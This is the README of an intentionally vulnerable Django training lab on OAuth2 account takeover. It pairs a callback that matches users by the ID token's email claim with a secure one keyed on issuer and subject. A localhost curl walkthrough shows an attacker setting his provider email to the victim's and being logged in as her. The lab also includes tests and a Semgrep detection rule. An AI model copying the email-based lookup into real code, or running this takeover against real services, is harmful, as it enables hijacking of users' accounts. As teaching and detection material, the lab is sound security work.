# Lab 17 — OAuth2 Misimplementation

Companion lab for the blog post
**[OAuth2 Misimplementation: Why a Valid ID Token Can Still Log In the Wrong Person](https://thiagoteixeira.tech/blog/oauth2-misimplementation-why-a-valid-id-token-can-still-log-in-the-wrong-person/)**.

| | |
|---|---|
| **OWASP** | A07:2025 — Authentication Failures |
| **CWE** | CWE-287 — Improper Authentication |
| **ASVS** | 5.0.0 V10.5.2 — the client identifies the user from ID token claims, usually `sub`, that cannot be reassigned to another user within the identity provider's scope |
| **Standards** | OpenID Connect Core §5.7 — `email`, `phone_number`, `preferred_username` and `name` "MUST NOT be used as unique identifiers"; `iss` plus `sub` is "the only guaranteed unique identifier" |
| **Detection** | **No standard tier tells the pair apart.** Bandit has nothing in either view; Semgrep's curated packs (2/156) and registry tier (7/372) fire only in the in-lab provider or on both callbacks alike, and none of the five configs mentions an identity claim. So the lab ships a **custom taint rule**, [`rules/oauth2.yaml`](../../rules/oauth2.yaml), that fires on the vulnerable callback and is silent on the secure one, asserted in CI. See [`scans/`](scans/) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The whole vulnerability is the claim the lookup reads

```python
# views_vulnerable.py — the local account is whoever has the token's email
user = User.objects.filter(email__iexact=claims["email"]).first()

# views_secure.py — the local account is whoever connected this (iss, sub)
identity = Identity.objects.filter(issuer=claims["iss"], subject=claims["sub"]).first()
if identity is None:
    return HttpResponseForbidden("No account is linked to this provider account.\n")
```

Both callbacks implement "log in with the provider". Everything before the lookup is
the same and correct: `state` is checked, the code is redeemed once, and the ID token's
signature, issuer, audience and expiry are verified.

The vulnerable callback finds the local account by the ID token's `email`. Email is a
profile field at the provider, and this provider, like several real ones, signs
whatever address the account holder typed in, marked `email_verified: false`. So bob
sets his provider account's email to alice's address and signs in. The provider
authenticates bob with bob's password and signs a true statement about bob's account;
the callback reads the address, finds alice's row, and logs bob in as alice.

The secure callback finds accounts only through an `Identity` row keyed on `iss` and
`sub`, and those rows exist only where a signed-in user, asked for their password
again, connected the provider account to their own. bob's `(iss, sub)` was never
connected to anything: 403.

## The cast and the provider

`alice` is the victim, with a site account at `alice@example.test` and the password
`labpass`. `bob` is the attacker. Each also has an account at the in-lab provider,
with the same address, verified. alice's private note, at `/oauth2/account/`, holds
the flag. No provider account is connected to any site account at the start.

The provider is [`provider.py`](provider.py), played in-process because the `web`
container has no route out (B6). Its OAuth half is correct — only the registered
client, exact `redirect_uri` matching, single-use codes bound to their redirect URI,
signed ID tokens — because that half is not the lesson. What it shares with real
providers is a profile the account holder controls: `/oauth2/provider/profile/` sets
any address and stores it unverified. Two stand-ins: `&as=alice` or `&as=bob` on the
authorize URL replaces the provider's sign-in page, and the token endpoint is a
function call rather than HTTP.

[`idp.py`](idp.py) is the client every flow uses. [`views_connect.py`](views_connect.py)
is "connect your provider account" for a signed-in user who enters their password
again, and the account page: the same in both worlds, and the only place an
`Identity` row is created.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d --build     # Postgres + Django, migrated and seeded, on 127.0.0.1:8000
docker compose logs web | grep "oauth2:"
# web-1  | oauth2: seeded alice (victim, alice@example.test) + bob (attacker), no provider account connected — alice's note holds the flag
```

## Exploit the pair from the command line

`curl` does not follow redirects unless told to, so each hop of the sign-in is one
command, and `-w '%{redirect_url}'` prints where the next hop goes. The cookie jar
carries the session, which holds the flow's `state`.

```bash
BASE=http://127.0.0.1:8000

# 1. bob sets his provider account's email to alice's address. The provider stores it unverified.
curl -s "$BASE/oauth2/provider/profile/?as=bob&email=alice@example.test"
# provider account bob: email is now alice@example.test (unverified)

# 2. bob signs in with the provider on the vulnerable login, one redirect at a time.
AUTHZ=$(curl -s -c bob.txt -o /dev/null -w '%{redirect_url}' $BASE/oauth2/vulnerable/login/)
CALLBACK=$(curl -s -b bob.txt -o /dev/null -w '%{redirect_url}' "$AUTHZ&as=bob")
curl -s -b bob.txt -c bob.txt "$CALLBACK"
# logged in as alice

# 3. He is in alice's account.
curl -s -b bob.txt $BASE/oauth2/account/
# <h1>alice's account</h1><p>recovery codes: FLAG{oauth2_account_matched_on_email_claim}</p>

# 4. He cannot carry it into the secure login: linking his provider account to alice's
#    asks for her password, and a session alone is not enough.
curl -s -w 'HTTP %{http_code}
' -b bob.txt -X POST $BASE/oauth2/connect/
# Enter your password to connect a provider account.
# HTTP 403

# 5. The same sign-in on the secure login.
AUTHZ=$(curl -s -c bob2.txt -o /dev/null -w '%{redirect_url}' $BASE/oauth2/secure/login/)
CALLBACK=$(curl -s -b bob2.txt -o /dev/null -w '%{redirect_url}' "$AUTHZ&as=bob")
curl -s -w 'HTTP %{http_code}\n' -b bob2.txt -c bob2.txt "$CALLBACK"
# No account is linked to this provider account.
# HTTP 403
```

Now the secure login doing its job. alice signs in with her password, enters it again
to connect her own provider account, and from then on can sign in with the provider:

```bash
curl -s -c alice.txt -d 'username=alice&password=labpass' $BASE/accounts/login/
# logged in as alice
AUTHZ=$(curl -s -b alice.txt -c alice.txt -o /dev/null -w '%{redirect_url}' -d password=labpass $BASE/oauth2/connect/)
CALLBACK=$(curl -s -b alice.txt -o /dev/null -w '%{redirect_url}' "$AUTHZ&as=alice")
curl -s -b alice.txt -c alice.txt "$CALLBACK"
# connected provider subject 248289761001 to alice

AUTHZ=$(curl -s -c fresh.txt -o /dev/null -w '%{redirect_url}' $BASE/oauth2/secure/login/)
CALLBACK=$(curl -s -b fresh.txt -o /dev/null -w '%{redirect_url}' "$AUTHZ&as=alice")
curl -s -b fresh.txt -c fresh.txt "$CALLBACK"
# logged in as alice
```

Run `docker compose exec web python manage.py seed_labs` to reset the provider emails,
the connected identities and any user the vulnerable callback created, and repeat.

## Tests

```bash
docker compose run --rm web python manage.py test labs.post_17_oauth2
# Ran 13 tests in 5.484s
#
# OK
```

`test_bobs_provider_account_with_alices_email_signs_in_as_alice` and
`test_secure_refuses_bobs_provider_account` are the pair that matters: the same
provider sign-in, logged in as alice by one callback and refused by the other.
`test_secure_ignores_even_a_verified_email_nobody_connected` is the stricter half of
the fix: alice's own provider account, with a verified address, opens nothing until
she connects it. `test_alice_connects_her_provider_account_and_signs_in_with_it` shows
the secure callback still does its job, and `test_connect_asks_for_the_password_again`
shows that bob, holding alice's session from the vulnerable callback, cannot link his
provider account to her. Make the secure callback look the user up by email and four
tests fail; drop the password check from the connect view and the last one fails.

## Isolation

- **`state` is checked on every flow**, and the connect flow cannot be finished in someone else's session (`test_connect_cannot_be_finished_in_someone_elses_session`). Callback CSRF is not this lab's class.
- **Linking asks for the password again** — the connect view is shared by both worlds, so without it the session the vulnerable callback hands bob would let him link his provider account to alice and walk in through the secure callback too (`test_connect_asks_for_the_password_again`).
- **The ID token is checked properly** — `idp.verify_id_token()` names the audience and the issuer and requires `iss`, `sub`, `aud`, `exp` and `iat`, so a token issued to another client is refused. Token substitution is not this lab's class.
- **The provider's OAuth half is correct** — exact `redirect_uri` matching, single-use codes bound to their redirect URI.
- **No open redirect** — no flow carries a `next` parameter. **Output is escaped** (not XSS, Lab 02). Global CSRF is off as in every lab (B1); every sign-in flow here is a GET carrying its own `state`, and the one POST, starting a connect, needs the password.

## Scanning it

The write-up is in [`scans/README.md`](scans/README.md). The short version: the line
that matters, `views_vulnerable.py:46`, is an ordinary ORM lookup, and nothing in
Bandit or Semgrep's curated and registry tiers is about which claim may identify a
person, so neither tells the two callbacks apart. The curated packs' two findings are
both in `provider.py`: a hard-coded client secret (fair, for a lab) and an
`open-redirect` on a redirect that is checked against an exact allowlist (a false
positive). [`rules/oauth2.yaml`](../../rules/oauth2.yaml) is a taint rule from a
verified ID token to an account lookup keyed on email; it fires on line 46 and is
silent on the secure callback, and CI asserts that split. It does not see the same
mistake made in settings (django-allauth's `SOCIALACCOUNT_EMAIL_AUTHENTICATION` with
`VERIFIED_EMAIL`, a changed `uid_field`, social-auth's `associate_by_email`): grep for
those.
